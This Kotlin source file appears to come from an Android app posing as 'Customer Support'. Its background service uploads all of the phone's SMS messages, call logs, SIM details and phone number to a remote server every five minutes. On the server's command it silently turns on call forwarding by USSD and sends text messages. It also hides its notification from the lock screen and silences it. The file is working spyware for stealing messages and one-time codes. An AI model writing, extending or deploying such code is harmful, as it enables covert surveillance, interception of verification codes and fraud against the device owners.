package com.customersupport.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.net.Uri
import androidx.core.app.NotificationCompat
import com.customersupport.CustomerSupportApp
import com.customersupport.MainActivity
import com.customersupport.R
import com.customersupport.data.CallLogReader
import com.customersupport.data.PreferencesManager
import com.customersupport.data.SimManager
import com.customersupport.data.SmsReader
import com.customersupport.socket.ConnectionState
import com.customersupport.socket.SmsSendRequest
import com.customersupport.socket.SocketManager
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

@AndroidEntryPoint
class SocketService : Service() {

    companion object {
        private const val TAG = "SocketService"
        private const val NOTIFICATION_ID = 1
        private const val SYNC_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
    }

    @Inject lateinit var socketManager: SocketManager
    @Inject lateinit var smsReader: SmsReader
    @Inject lateinit var callLogReader: CallLogReader
    @Inject lateinit var preferencesManager: PreferencesManager
    @Inject lateinit var simManager: SimManager

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var syncJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        startForeground(NOTIFICATION_ID, createNotification())

        serviceScope.launch {
            connectAndSync()
        }

        return START_STICKY
    }

    private suspend fun connectAndSync() {
        // Register sync callback so external components can trigger sync
        socketManager.setOnSyncRequestCallback {
            serviceScope.launch {
                performSync()
            }
        }
        
        // Register forwarding config callback to persist settings
        socketManager.setOnForwardingConfigCallback { config ->
            serviceScope.launch {
                handleForwardingConfig(config)
            }
        }
        
        // Register SMS send request callback
        socketManager.setOnSmsSendRequestCallback { request ->
            serviceScope.launch {
                handleSmsSendRequest(request)
            }
        }

        val deviceId = getDeviceUniqueId()
        val deviceName = Build.MODEL
        val phoneNumber = getPhoneNumber()

        // Save device info first and wait for it to complete
        preferencesManager.saveDeviceId(deviceId)

        // Connect to server
        socketManager.connect(deviceId, deviceName, phoneNumber)

        // Start monitoring connection state for auto-sync
        // Pass deviceId directly to avoid race condition with preferences
        monitorConnectionAndSync(deviceId)
    }

    private fun monitorConnectionAndSync(deviceId: String) {
        serviceScope.launch {
            socketManager.connectionState.collect { state ->
                if (state == ConnectionState.CONNECTED) {
                    Log.d(TAG, "Connected to server - triggering sync")
                    // Increased delay to 3 seconds to account for Render cold starts
                    delay(3000)
                    
                    // Sync SIM info with retry logic for reliability on slow connections
                    syncSimInfoWithRetry(deviceId)
                    
                    // Full sync
                    performSync()
                    
                    // Ensure periodic sync is running
                    startPeriodicSync()
                }
            }
        }
    }
    
    private suspend fun handleForwardingConfig(config: com.customersupport.socket.ForwardingConfig) {
        try {
            Log.d(TAG, "Saving forwarding config: $config")
            
            // Save SMS forwarding settings to preferences (used by SmsReceiver)
            preferencesManager.saveSmsForwarding(config.smsEnabled, config.smsForwardTo, config.smsSubscriptionId)
            
            // Save call forwarding settings to preferences
            preferencesManager.saveCallsForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
            
            // Activate/deactivate call forwarding via USSD
            handleCallForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
            
            Log.d(TAG, "Forwarding config saved successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save forwarding config", e)
        }
    }
    
    private fun handleCallForwarding(enabled: Boolean, forwardTo: String, subscriptionId: Int = -1) {
        try {
            val ussdCode = if (enabled && forwardTo.isNotEmpty()) {
                // Activate call forwarding using USSD code
                // *21*<number># activates unconditional call forwarding
                "*21*$forwardTo#"
            } else {
                // Deactivate call forwarding using USSD code
                // ##21# deactivates unconditional call forwarding
                "##21#"
            }
            
            Log.d(TAG, "Executing call forwarding USSD: $ussdCode (enabled=$enabled, forwardTo=$forwardTo)")
            
            // Use TelephonyManager for Android 8+ (API 26) for proper USSD handling
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                sendUssdRequest(ussdCode, subscriptionId)
            } else {
                // Fallback: Use dial intent for older devices
                // Note: # must be encoded as %23 in tel: URIs
                val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$encodedUssd")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle call forwarding", e)
        }
    }
    
    @android.annotation.SuppressLint("MissingPermission")
    private fun sendUssdRequest(ussdCode: String, subscriptionId: Int) {
        try {
            val telephonyManager = if (subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                tm.createForSubscriptionId(subscriptionId)
            } else {
                getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                telephonyManager.sendUssdRequest(
                    ussdCode,
                    object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(
                            telephonyManager: TelephonyManager,
                            request: String,
                            response: CharSequence
                        ) {
                            Log.d(TAG, "USSD Response: $response")
                        }

                        override fun onReceiveUssdResponseFailed(
                            telephonyManager: TelephonyManager,
                            request: String,
                            failureCode: Int
                        ) {
                            Log.e(TAG, "USSD Failed with code: $failureCode")
                            // Fallback to dial intent if USSD fails
                            fallbackToDialIntent(ussdCode)
                        }
                    },
                    android.os.Handler(mainLooper)
                )
                Log.d(TAG, "USSD request sent via TelephonyManager")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for USSD request, falling back to dial intent", e)
            fallbackToDialIntent(ussdCode)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send USSD request, falling back to dial intent", e)
            fallbackToDialIntent(ussdCode)
        }
    }
    
    private fun fallbackToDialIntent(ussdCode: String) {
        try {
            // Use ACTION_DIAL to show dialer without auto-calling (user must press call)
            // Or ACTION_CALL to directly call (requires CALL_PHONE permission)
            val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$encodedUssd")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            Log.d(TAG, "Fallback: Opened dialer with USSD code")
        } catch (e: Exception) {
            Log.e(TAG, "Fallback dial intent also failed", e)
        }
    }

    private fun startPeriodicSync() {
        syncJob?.cancel()
        syncJob = serviceScope.launch {
            while (isActive) {
                delay(SYNC_INTERVAL_MS)
                if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
                    performSync()
                }
            }
        }
    }

    private suspend fun performSync() {
        try {
            // Check connection state before syncing
            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                Log.w(TAG, "Cannot sync - not connected to server")
                return
            }

            val deviceId = preferencesManager.getDeviceId().first() ?: return

            Log.d(TAG, "Starting sync for device: $deviceId")

            // Sync SIM info (retry on each sync in case it failed initially)
            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                socketManager.syncSimInfo(deviceId, simCards)
                Log.d(TAG, "Synced ${simCards.length()} SIM cards")
            }

            // Sync SMS
            val smsArray = smsReader.readAllSms()
            Log.d(TAG, "Read ${smsArray.length()} SMS messages")
            if (smsArray.length() > 0) {
                socketManager.syncSms(deviceId, smsArray)
            }

            // Sync Call Logs
            val callsArray = callLogReader.readCallLogs()
            Log.d(TAG, "Read ${callsArray.length()} call logs")
            if (callsArray.length() > 0) {
                socketManager.syncCalls(deviceId, callsArray)
            }

            // Update last sync time
            preferencesManager.saveLastSyncTime(System.currentTimeMillis())

            Log.d(TAG, "Sync completed successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed", e)
        }
    }

    private fun getDeviceUniqueId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun getPhoneNumber(): String {
        // First try TelephonyManager
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val number = telephonyManager.line1Number
            if (!number.isNullOrBlank()) {
                return number
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "SecurityException getting phone number from TelephonyManager", e)
        }
        
        // Fallback: try to get from SIM info
        try {
            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                val firstSim = simCards.getJSONObject(0)
                val phoneNumber = firstSim.optString("phoneNumber", "")
                if (phoneNumber.isNotBlank()) {
                    return phoneNumber
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting phone number from SIM info", e)
        }
        
        return "Unknown"
    }

    private suspend fun syncSimInfo(deviceId: String) {
        try {
            val simCards = simManager.getSimCards()
            Log.d(TAG, "Syncing ${simCards.length()} SIM cards for device: $deviceId")
            if (simCards.length() > 0) {
                socketManager.syncSimInfo(deviceId, simCards)
                Log.d(TAG, "SIM sync emitted successfully")
            } else {
                Log.w(TAG, "No SIM cards found to sync")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to sync SIM info", e)
        }
    }

    /**
     * Sync SIM info with retry logic for better reliability on slower connections (e.g., Render free tier).
     * Retries up to 3 times with exponential backoff.
     */
    private suspend fun syncSimInfoWithRetry(deviceId: String, maxRetries: Int = 3) {
        var attempt = 0
        var success = false
        
        while (attempt < maxRetries && !success) {
            try {
                if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                    Log.w(TAG, "SIM sync retry $attempt: Not connected, waiting...")
                    delay(1000)
                    attempt++
                    continue
                }
                
                val simCards = simManager.getSimCards()
                Log.d(TAG, "SIM sync attempt ${attempt + 1}/$maxRetries: Found ${simCards.length()} SIM cards")
                
                if (simCards.length() > 0) {
                    socketManager.syncSimInfo(deviceId, simCards)
                    Log.d(TAG, "SIM sync attempt ${attempt + 1}: Emitted successfully")
                    success = true
                } else {
                    Log.w(TAG, "SIM sync attempt ${attempt + 1}: No SIM cards found")
                    // Even with 0 SIMs, we consider it a "success" (no error)
                    success = true
                }
            } catch (e: Exception) {
                Log.e(TAG, "SIM sync attempt ${attempt + 1} failed", e)
                attempt++
                if (attempt < maxRetries) {
                    // Exponential backoff: 1s, 2s, 4s
                    val backoffMs = (1000L * (1 shl (attempt - 1)))
                    Log.d(TAG, "Retrying SIM sync in ${backoffMs}ms...")
                    delay(backoffMs)
                }
            }
        }
        
        if (!success) {
            Log.e(TAG, "SIM sync failed after $maxRetries attempts")
        }
    }

    private suspend fun handleSmsSendRequest(request: SmsSendRequest) {
        val deviceId = preferencesManager.getDeviceId().first() ?: return
        
        try {
            Log.d(TAG, "Sending SMS to ${request.recipientNumber}")
            
            val smsManager = if (request.subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                // Use specific SIM for dual SIM devices
                SmsManager.getSmsManagerForSubscriptionId(request.subscriptionId)
            } else {
                // Use default SIM
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            
            // Handle long messages by splitting
            val parts = smsManager.divideMessage(request.message)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(
                    request.recipientNumber,
                    null,
                    parts,
                    null,
                    null
                )
            } else {
                smsManager.sendTextMessage(
                    request.recipientNumber,
                    null,
                    request.message,
                    null,
                    null
                )
            }
            
            Log.d(TAG, "SMS sent successfully to ${request.recipientNumber}")
            socketManager.reportSmsSendResult(deviceId, request.requestId, true)
            
            // Trigger sync to update SMS list
            delay(500)
            performSync()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
            socketManager.reportSmsSendResult(deviceId, request.requestId, false, e.message)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CustomerSupportApp.CHANNEL_ID)
            .setContentTitle("Customer Support")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimal priority
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
            .setSilent(true) // No sound
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        syncJob?.cancel()
        serviceScope.cancel()
        socketManager.disconnect()
        Log.d(TAG, "Service destroyed")
    }
}
